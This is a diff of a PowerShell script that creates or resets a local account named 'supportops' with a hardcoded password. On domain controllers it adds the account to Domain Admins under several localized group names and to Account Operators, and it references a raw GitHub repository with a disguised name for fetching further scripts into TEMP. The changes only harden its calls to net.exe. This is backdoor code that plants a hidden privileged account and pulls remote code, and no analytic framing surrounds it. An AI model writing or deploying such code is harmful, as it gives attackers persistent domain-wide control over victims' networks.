@@ -5,16 +5,19 @@ $password = "Qz7!Mtn5#R2p"
 $root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
 $computer = Get-CimInstance Win32_ComputerSystem
 $isDc = $computer.DomainRole -in 4, 5
+$net = Join-Path $env:SystemRoot "System32\net.exe"
 
 $user = Get-LocalUser -Name "supportops" -ErrorAction SilentlyContinue
 if (-not $user) {
-    net user supportops $password /add 2>&1 | Out-String | Write-Output
+    & $net user supportops $password /add 2>&1 | Out-String | Write-Output
 } else {
-    net user supportops $password 2>&1 | Out-String | Write-Output
+    & $net user supportops $password 2>&1 | Out-String | Write-Output
 }
 
 if ($isDc) {
-    net user supportops $password /domain 2>&1 | Out-String | Write-Output
+    & $net user supportops $password /domain 2>&1 |
+        Out-String |
+        Write-Output
     foreach ($group in @(
         "Domain Admins",
         "Admins. del dominio",
@@ -22,11 +25,11 @@ if ($isDc) {
         "Domanen-Admins",
         "Domänen-Admins"
     )) {
-        net group $group supportops /domain /add 2>&1 |
+        & $net group $group supportops /domain /add 2>&1 |
             Out-String |
             Write-Output
     }
-    net group "Account Operators" supportops /domain /add 2>&1 |
+    & $net group "Account Operators" supportops /domain /add 2>&1 |
         Out-String |
         Write-Output
 } else {
@@ -49,7 +52,7 @@ try {
     Write-Output "SUPPORTOPS_FLAGS_ERROR=$($_.Exception.Message)"
 }
 
-net user supportops 2>&1 | Out-String | Write-Output
+& $net user supportops 2>&1 | Out-String | Write-Output
 Write-Output "SUPPORTOPS_PRESENT=yes"
 
 $githubFile = Join-Path $env:TEMP "manual-client-run.ps1"
